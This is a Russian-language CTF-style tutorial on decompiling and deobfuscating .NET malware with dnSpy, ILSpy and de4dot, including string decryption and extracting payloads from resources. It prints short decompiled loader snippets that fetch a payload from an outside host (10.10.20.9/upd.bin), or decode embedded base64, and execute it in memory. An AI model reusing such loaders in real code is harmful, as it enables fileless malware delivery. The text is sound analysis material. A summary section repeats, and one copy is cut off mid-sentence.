## Вопрос, с которого всё начинается

Образец написан на **.NET** — управляемом языке. Это удача для аналитика: код можно
**декомпилировать** обратно в C# почти без потерь. Но малварь часто **обфусцирована**. Как
получить читаемый код?

Разберём сквозной пример: декомпилируем и деобфусцируем .NET-образец.

## Как распознать .NET

.NET-сборка — это PE-файл, но с управляемым кодом. Признаки:

- В импортах есть **`mscoree.dll`** (движок CLR) и метод **`_CorExeMain`**.
- Инструмент **DIE**/`file` подсказывает «.NET assembly».
- Секция с метаданными CLR, строки вида `mscorlib`, `System.`.

```
$ file invoice.exe
invoice.exe: PE32 executable (GUI) Intel 80386, .NET assembly
```

Управляемый код не компилируется в машинные инструкции сразу, а исполняется CLR, поэтому
его структура (метаданные, IL-код) сохраняется в файле — отсюда возможность декомпиляции.

## Наш пример: декомпиляция

Открываем образец в **dnSpy** (или **ILSpy**) — это даёт почти исходный C#:

```csharp
public static void Main() {
    string url = "http://10.10.20.9/upd.bin";
    byte[] data = new WebClient().DownloadData(url);
    Assembly.Load(data).EntryPoint.Invoke(null, null);
}
```

Читаем: программа скачивает данные по URL и **загружает их как сборку в память**, вызывая
точку входа. Это классический .NET-загрузчик: полезная нагрузка живёт только в памяти
(**fileless**). В CTF строка может содержать флаг:

```
string flag = "nto{d0tn3t_d3c0mp1l3d}";
```

## Обфускация и её снятие

Обфускаторы .NET (ConfuserEx, Eazfuscator, .NET Reactor) делают код нечитаемым: переименовывают
классы в странные символы, добавляют «мусорные» методы, шифруют строки, внедряют
управляемый поток. Снимают это инструментом **de4dot**:

```
$ de4dot invoice.exe -o cleaned.exe
Detected ConfuserEx v1.0.0
Cleaning ...
```

После очистки декомпиляция снова даёт читаемый код. de4dot автоматически определяет
популярные обфускаторы и снимает их.

### Строковое шифрование

Частая защита — **зашифрованные строки**: в коде не видно URL, вместо него вызов
`Decrypt("aBc123")`. Способы решения: запустить метод расшифровки (в песочнице), найти
алгоритм и воспроизвести его, или перехватить строки в памяти после расшифровки. Инструменты
вроде **de4dot** и плагинов dnSpy умеют автоматически вызывать такие методы.

## Извлечение полезной нагрузки

.NET-загрузчики часто прячут вторую стадию в **ресурсах** сборки. Её извлекают: в dnSpy
открывают ресурсы и выгружают поток, либо находят массив байт в коде и выгружают его. Затем
определяют тип (`file`) и анализируют отдельно. Так восстанавливается полная цепочка:
загрузчик → ресурс → финальная нагрузка.

## Практический сценарий: разбор .NET-загрузчика

Разберём полный пример. Дан образец `update.exe`, определённый как .NET-сборка. Запускать
нельзя — работаем статически.

Открываем в dnSpy и сразу видим классы с именами вроде `A`, `B0`, `\u0001` — признак
**обфускации**. Запускаем de4dot:

```
$ de4dot update.exe -o cleaned.exe
Detected .NET Reactor
Cleaning ...
```

После очистки имена классов становятся осмысленными, и код читается. Находим метод `Main`:

```csharp
byte[] payload = Convert.FromBase64String(
    "TVqQAAMAAAAEAAAA...");
Assembly asm = Assembly.Load(payload);
asm.EntryPoint.Invoke(null, null);
```

Читаем: строка base64 — это PE-файл (начинается с `TVqQAAM` = `MZ`). Программа декодирует
его и **загружает в память**, не записывая на диск. Это классический fileless-загрузчик.
Декодируем base64 в файл и анализируем вторую стадию отдельно.

Дальше смотрим **ресурсы** сборки: там может лежать ещё одна нагрузка. Выгружаем и
проверяем. Так восстанавливается полная цепочка: .NET-загрузчик → встроенный PE → финальная
малварь.

В CTF флаг может лежать прямо в строке или в ресурсе:

```
$ strings update.exe | grep nto
nto{d0tn3t_d3c0mp1l3d}
```

## Строковое шифрование и его обход

Продвинутые обфускаторы шифруют строки: в коде вместо URL — вызов метода дешифровки. Обход:
запустить метод в песочнице (dnSpy позволяет вызвать метод и увидеть результат), либо найти
алгоритм и воспроизвести его скриптом, либо перехватить строки в памяти после расшифровки.
Плагины dnSpy (например, **StringDecryptor**) автоматически вызывают методы дешифровки и
подставляют результаты прямо в код. Это резко ускоряет анализ.

## Управляемый поток и другие трюки

Некоторые обфускаторы используют **управляемый поток управления** (control-flow flattening):
логика превращается в большой `switch`, где порядок определяется переменной состояния.
Такой код формально корректен, но нечитаем. Снимается либо деобфускатором, либо
**динамической трассировкой**: запускаем в песочнице и смотрим, какие методы вызываются в
каком порядке. Трассировка часто восстанавливает логику быстрее, чем ручной разбор.

## Анализ без запуска

Важное преимущество .NET: декомпиляция даёт почти исходный код, поэтому **большую часть
анализа можно провести статически**. Строки, алгоритмы, встроенные нагрузки, адреса — всё
видно после снятия обфускации. Динамика нужна только для расшифровки строк или для
наблюдения за поведением. Для CTF обычно достаточно статики.

## Частые ошибки

- **Игнорировать признак .NET.** Проверяй импорт `mscoree.dll`.
- **Не снимать обфускацию.** Без de4dot код нечитаем.
- **Забывать про ресурсы.** Вторая стадия часто там.
- **Запускать образец вне песочницы.** Динамика только в изоляции.
- **Пропускать base64-нагрузку.** Декодируй длинные строки — это может быть PE.

## Что это даёт в отчёте

По .NET-малвари в отчёте фиксируют: тип сборки, применённую обфускацию и метод снятия,
декомпилированный ключевой код, извлечённые нагрузки и IOC. Это даёт и понимание поведения,
и материал для детектов (YARA по строкам, сигнатуры по обфускатору), что делает анализ
завершённым и полезным для защиты.

## Сравнение с неуправляемой малварью

Полезно понимать, почему .NET-образцы «легче» для анализа. Неуправляемый код компилируется в
машинные инструкции, и аналитик восстанавливает логику по дизассемблеру — трудоёмко и
требует опыта. Управляемый код хранит **метаданные** (имена типов, методов, полей) и
**IL-код** — промежуточное представление. Декомпилятор переводит IL обратно в C#, сохраняя
структуру и имена. Поэтому .NET-малварь часто «читается как книга» — если снять обфускацию.

Но у этого есть и обратная сторона: авторы малвари знают о лёгкости анализа и применяют
агрессивную обфускацию. Поэтому навык работы с **de4dot** и деобфускаторами обязателен.

## Смешанный режим (mixed-mode)

Некоторые .NET-образцы используют **смешанный режим**: управляемый код вызывает неуправляемый
(нативный) через P/Invoke или C++/CLI. Тогда декомпиляция показывает только «верхушку», а
основная логика — в нативном коде. Для анализа таких образцов комбинируют dnSpy (для
управляемой части) и дизассемблер (для нативной). Признак смешанного режима — импорты
нативных функций рядом с CLR-метаданными.

## Извлечение нагрузок из ресурсов

Разберём подробнее. В dnSpy открываем узел `Resources` сборки и смотрим записи. Нагрузка
может быть сохранена как поток байт. Её выгружают, определяют тип командой `file` и
анализируют. Часто там PE-файл или другая сборка .NET. Если нагрузка зашифрована, ищем метод
её расшифровки в коде и применяем. Так восстанавливается вся цепочка до финального
вредоносного кода.

## Работа с анти-анализом

.NET-образцы применяют анти-отладку и анти-ВМ: проверяют наличие отладчика, имена процессов
инструментов, работу в виртуальной машине. Признаки — вызовы `Debugger.IsAttached`,
проверки `Environment`, обращения к WMI за информацией о железе. Обход — правка кода
(патчинг проверок) или запуск в «чистой» ВМ. Понимание анти-анализа важно: иначе образец
может вести себя «тихо» и обмануть динамический этап.

## Итог

.NET-малварь анализируют декомпиляцией и деобфускацией: dnSpy даёт читаемый C#, de4dot
снимает обфускацию, ресурсы и base64-строки дают вторую стадию. Это один из самых
«благодарных» видов малвари для анализа — при условии владения инструментами.

## Инструменты анализа .NET

Полезно держать в голове набор инструментов. **dnSpy** — де-факто стандарт: декомпилятор,
отладчик и редактор в одном окне; позволяет править код и перезапускать. **ILSpy** —
чистый декомпилятор, удобен для быстрого чтения. **de4dot** — снятие обфускации. **dotPeek**
и **JustDecompile** — альтернативные декомпиляторы. **Detect It Easy** — определение
упаковщика/обфускатора. Вместе они покрывают весь цикл: распознать, декомпилировать, снять
обфускацию, разобрать ресурсы, выгрузить нагрузку.

Отдельно стоит упомянуть **Frida** и **dnSpy-скрипты**: они позволяют перехватывать вызовы
в рантайме, что незаменимо при строковом шифровании и анти-отладке. Комбинация статической
декомпиляции и динамического перехвата даёт максимально полную картину.

## Что это даёт в отчёте (продолжение)

По .NET-образцу в отчёте перечисляют: применённые обфускаторы и методы их снятия,
декомпилированные ключевые фрагменты (загрузка, расшифровка, закрепление), извлечённые
встроенные нагрузки и IOC. Это позволяет воспроизвести анализ, построить детекты и связать
образец с кампанией — то есть превратить «файл» в разведывательную информацию.

## Итог

.NET-малварь анализируют декомпиляцией и деобфускацией: dnSpy даёт читаемый C#, de4dot
снимает обфускацию, ресурсы и base64-строки открывают вторую стадию. Это один из самых
«благодарных» видов малвари для разбора — при условии владения инструментами и понимания

## Финальная мысль

Не забывайте: декомпилированный код — это ещё не весь образец. Всегда проверяйте ресурсы,
base64-строки и встроенные нагрузки, потому что настоящая малварь часто спрятана именно там,
а «верхушка» лишь загружает её.

## Что мы теперь знаем

- **.NET-сборка** — PE с управляемым кодом; признак — `mscoree.dll`/`_CorExeMain`.
- Управляемый код **декомпилируется** почти в исходный C# (**dnSpy**, **ILSpy**).
- Частый шаблон: скачать байты и **загрузить сборку в память** (fileless).
- Обфускаторы снимают **de4dot**; строки могут быть **зашифрованы**.
- Полезную нагрузку часто прячут в **ресурсах** — её выгружают и анализируют отдельно.
